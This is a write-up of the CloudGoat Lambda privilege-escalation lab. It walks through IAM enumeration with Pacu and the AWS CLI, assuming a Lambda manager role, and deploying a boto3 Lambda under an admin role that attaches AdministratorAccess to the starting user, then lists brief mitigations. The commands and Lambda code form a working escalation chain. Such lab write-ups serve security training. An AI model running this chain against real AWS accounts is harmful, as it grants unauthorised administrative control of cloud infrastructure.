# 🛡️ CloudGoat Lambda Privilege Escalation Writeup

This writeup details a privilege escalation scenario in an AWS environment simulated using [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat). The scenario involves escalating IAM permissions via a misconfigured Lambda management role.

---

## 🔐 Initial Access

Using the credentials provided from CloudGoat:


AWS Access Key ID:     AKIA****************  
AWS Secret Access Key: ***************************************


---

## 🔍 IAM Enumeration (PACU)

Using [Pacu](https://github.com/RhinoSecurityLabs/pacu), we first enumerate the account permissions:

bash
run iam__enum_permissions


Key findings:
- **User:** chris-cgid61ul1qxgdg
- **Account:** 727671863602
- **ARN:** arn:aws:iam::727671863602:user/chris-cgid61ul1qxgdg

### Policies and Roles Discovered:

- **Roles:**
  - cg-debug-role-cgid61ul1qxgdg
  - cg-lambdaManager-role-cgid61ul1qxgdg
- **Policies:**
  - cg-chris-policy-cgid61ul1qxgdg (attached to chris)
  - cg-lambdaManager-policy-cgid61ul1qxgdg

These policies include permissions such as:

json
{
  "Action": [
    "sts:AssumeRole",
    "iam:List*",
    "iam:Get*"
  ],
  "Effect": "Allow",
  "Resource": "*"
}


---

## 🧑‍💻 CLI Enumeration Steps

bash
aws sts get-caller-identity --profile lambda_priv
aws iam list-user-policies --user-name chris-cgid61ul1qxgdg --profile lambda_priv
aws iam list-attached-user-policies --user-name chris-cgid61ul1qxgdg --profile lambda_priv
aws iam get-policy-version --policy-arn arn:aws:iam::727671863602:policy/cg-chris-policy-cgid61ul1qxgdg --version-id v1 --profile lambda_priv


Permissions granted allow:
- Role assumption
- Listing and reading IAM roles/policies

### Role Permissions Breakdown

**cg-lambdaManager-policy-cgid61ul1qxgdg**:
json
{
  "Action": [
    "lambda:*",
    "iam:PassRole"
  ],
  "Effect": "Allow",
  "Resource": "*"
}


**cg-debug-role-cgid61ul1qxgdg**:
- Attached policy: AdministratorAccess 👑

---

## ⚔️ Attack Plan

1. **Assume** the cg-lambdaManager-role-cgid61ul1qxgdg
2. **Create** a Lambda function using cg-debug-role-cgid61ul1qxgdg (which has admin rights)
3. **Invoke** the Lambda to attach the AdministratorAccess policy to the chris user

---

## 📦 Privilege Escalation Execution

### Step 1: Assume Lambda Manager Role

bash
aws sts assume-role \
  --role-arn arn:aws:iam::727671863602:role/cg-lambdaManager-role-cgid61ul1qxgdg \
  --role-session-name lambdamanager \
  --profile lambda_priv


Configure a new AWS CLI profile with these temporary credentials.

---

### Step 2: Write the Lambda Payload

**lambda_function.py**:
python
import boto3

def lambda_handler(event, context):
    iam = boto3.client('iam')
    target_user = 'chris-cgid61ul1qxgdg'
    policy_arn = 'arn:aws:iam::aws:policy/AdministratorAccess'

    response = iam.attach_user_policy(
        UserName=target_user,
        PolicyArn=policy_arn
    )

    return {
        'statusCode': 200,
        'body': f'Policy attached to {target_user}'
    }


bash
zip lambda_function.py.zip lambda_function.py


---

### Step 3: Deploy the Lambda

bash
aws lambda create-function \
  --function-name admin_function \
  --runtime python3.9 \
  --role arn:aws:iam::727671863602:role/cg-debug-role-cgid61ul1qxgdg \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://lambda_function.py.zip \
  --profile lambdamanager \
  --region us-east-1


---

### Step 4: Invoke the Function

bash
aws lambda invoke \
  --function-name admin_function \
  --profile lambdamanager \
  --region us-east-1 \
  output.json


---

## ✅ Results

AdministratorAccess was successfully attached to the chris user. We now have full administrative privileges.

---

## 🔚 Summary

| Step | Description |
|------|-------------|
| 🧑 Access | Credentials obtained via CloudGoat |
| 🧭 Enumeration | IAM roles, users, and policies explored using Pacu and AWS CLI |
| 🪜 Escalation | Role assumed → Lambda created → Privileged function executed |
| 🛡️ Outcome | Full admin access via policy attachment |

---

## 📝 Mitigations

- Avoid attaching overly permissive policies like iam:PassRole to roles accessible by non-admin users.
- Audit role trust relationships regularly.
- Implement least privilege principles.
